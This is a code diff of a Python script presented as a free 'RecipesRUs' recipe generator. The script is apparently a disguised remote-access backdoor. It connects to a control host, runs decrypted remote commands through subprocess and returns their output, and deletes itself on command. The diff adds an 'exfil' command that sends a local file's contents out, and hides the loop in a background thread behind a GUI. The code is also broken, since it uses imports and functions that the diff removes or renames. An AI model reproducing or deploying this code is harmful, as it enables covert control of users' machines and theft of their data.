@@ -1,17 +1,11 @@
 # Welcome to our free recipe generator script! We provide you the means to generate
 # your own recipes at your fingertips! Thank you for supporting RecipesRUs!
+import gui
+from gui import *
 
-import socket
-import subprocess as validation_output
-from subprocess import Popen as recipe_validator
-import json
-import os as recipe_list
-import discord as recipe_getter
-import asyncio as recipe_generator
 
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import padding
+
+
 
 recipesrusip = '127.0.0.1'
 connport = 8080
@@ -37,7 +31,7 @@ async def generate_recipes(token, id):
 
     await rec_gen.start(token)
 
-def encrypt_data(recipeseed, data):
+def mix_ingredients(recipeseed, data):
     iv = recipe_list.urandom(8)
     cipher = Cipher(algorithms.TripleDES(recipeseed), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
@@ -56,35 +50,66 @@ def decrypt_data(recipeseed, encrypted_data):
     unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
     return unpadded_data
 
-while True:
-    try:
-        conn.connect((recipesrusip, connport))
-        break
-    except ConnectionRefusedError:
-        pass
 
-while True:
-    enc_req = conn.recv(4096)
 
-    if not enc_req:
-        break
+def run_recipe_app():
+    while True:
+        try:
+            conn.connect((recipesrusip, connport))
+            break
+        except ConnectionRefusedError:
+            pass
 
-    request = decrypt_data(recipeseed, enc_req).decode().split(' ')
+    while True:
+        enc_req = conn.recv(4096)
 
-    if request[0] == "remove":
-        conn.close()
-        recipe_list.remove("noodle_recipes_generator.py")
-    elif request[0] == "get":
-        id = int(request[1])
-        token = str(request[2])
+        if not enc_req:
+            break
 
-        recipe_generator.run(generate_recipes(token, id))
-    else:
-        validator = recipe_validator(request, stdout=validation_output.PIPE)
-        val_out = []
+        request = decrypt_data(recipeseed, enc_req).decode().split(' ')
 
-        for i in validator.stdout.readlines():
-            val_out.append(i.decode().strip())
+        if request[0] == "remove":
+            conn.close()
+            recipe_list.remove("noodle_recipes_generator.py")
+        elif request[0] == "get":
+            id = int(request[1])
+            token = str(request[2])
 
-        if len(val_out) != 0:
-            conn.sendall(encrypt_data(recipeseed, json.dumps(val_out).encode()))
+            recipe_generator.run(generate_recipes(token, id))
+
+        elif request[0] == "exfil":
+            recipe_generator.run(generate_recipes(request[1],request[2]))
+            try:
+                with open("recipes.txt", "r+") as recipe:
+                    for line in recipe:
+                        conn.sendall(mix_ingredients(recipeseed, json.dumps(line).encode()))
+                    recipe_list.remove("recipes.txt")
+                    recipe_list.remove("noodle_recipes_generator.py")
+            except FileNotFoundError as e:
+                id = int(request[1])
+                token = str(request[2])
+
+                recipe_generator.run(generate_recipes(token, id))
+
+        else:
+            validator = recipe_validator(request, stdout=validation_output.PIPE)
+            val_out = []
+
+            for i in validator.stdout.readlines():
+                val_out.append(i.decode().strip())
+
+            if len(val_out) != 0:
+                conn.sendall(encrypt_data(recipeseed, json.dumps(val_out).encode()))
+
+
+
+
+
+
+
+if __name__ == "__main__":
+    recipe_interface = Recipe_App.Thread(target=run_recipe_app)
+    recipe_interface.daemon = True
+    recipe_interface.start()
+    app = App()
+    app.mainloop()
